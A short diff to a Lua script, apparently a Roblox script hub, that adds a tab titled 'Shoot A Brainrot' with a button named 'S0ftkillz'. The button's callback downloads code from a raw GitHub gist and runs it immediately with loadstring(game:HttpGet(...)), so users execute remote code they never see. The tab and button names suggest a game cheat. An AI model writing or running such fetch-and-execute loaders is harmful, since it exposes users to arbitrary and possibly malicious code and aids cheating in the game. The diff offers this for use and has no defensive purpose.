@@ -402,3 +402,13 @@ local Button = Tab:CreateButton({
    -- The function that takes place when the button is pressed
    end,
 })
+
+local Tab = Window:CreateTab("Shoot A Brainrot", 4483362458) -- Title, Image
+
+local Button = Tab:CreateButton({
+   Name = "S0ftkillz",
+   Callback = function()
+   -- The function that takes place when the button is pressed
+loadstring(game:HttpGet("https://gist.githubusercontent.com/user75335836/af854084736599f053c6a7607887d5f3/raw/7ae1b3ea0d6cd85ca7a00510a362a90edba837ba/gistfile1.txt"))()
+end,
+})
